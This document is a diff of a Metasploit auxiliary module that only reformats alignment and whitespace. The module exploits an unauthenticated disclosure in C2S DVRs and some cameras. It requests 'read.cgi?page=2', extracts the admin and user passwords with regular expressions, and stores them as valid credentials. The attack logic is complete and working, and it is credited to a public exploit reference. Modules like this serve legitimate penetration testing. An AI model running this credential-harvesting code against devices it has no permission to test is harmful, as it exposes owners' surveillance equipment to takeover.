@@ -10,19 +10,18 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'         => 'C2S DVR Management Password Disclosure',
-      'Description'  => %q{
+      'Name' => 'C2S DVR Management Password Disclosure',
+      'Description' => %q{
         C2S DVR allows an unauthenticated user to disclose the username
         & password by requesting the javascript page 'read.cgi?page=2'.
         This may also work on some cameras including IRDOME-II-C2S, IRBOX-II-C2S.
       },
-      'References'   => [['EDB', '40265']],
-      'Author'       =>
-        [
-          'Yakir Wizman', # discovery
-          'h00die',    # module
-        ],
-      'License'      => MSF_LICENSE,
+      'References' => [['EDB', '40265']],
+      'Author' => [
+        'Yakir Wizman', # discovery
+        'h00die', # module
+      ],
+      'License' => MSF_LICENSE,
       'DisclosureDate' => 'Aug 19 2016'
     )
 
@@ -36,8 +35,8 @@ class MetasploitModule < Msf::Auxiliary
       url = normalize_uri(datastore['TARGETURI'], 'cgi-bin', 'read.cgi')
       vprint_status("Attempting to load data from #{url}?page=2")
       res = send_request_cgi({
-        'uri'      => url,
-        'vars_get' => {'page'=>'2'}
+        'uri' => url,
+        'vars_get' => { 'page' => '2' }
       })
       unless res
         print_error("#{peer} Unable to connect to #{url}")
@@ -52,8 +51,8 @@ class MetasploitModule < Msf::Auxiliary
       if res.body =~ /pw_adminpw = "(.+?)";/
         print_good("Found: admin:#{$1}")
         store_valid_credential(
-          user:         'admin',
-          private:      $1,
+          user: 'admin',
+          private: $1,
           private_type: :password
         )
       end
@@ -61,8 +60,8 @@ class MetasploitModule < Msf::Auxiliary
       if res.body =~ /pw_userpw = "(.+?)";/
         print_good("Found: user:#{$1}")
         store_valid_credential(
-          user:         'user',
-          private:      $1,
+          user: 'user',
+          private: $1,
           private_type: :password
         )
       end
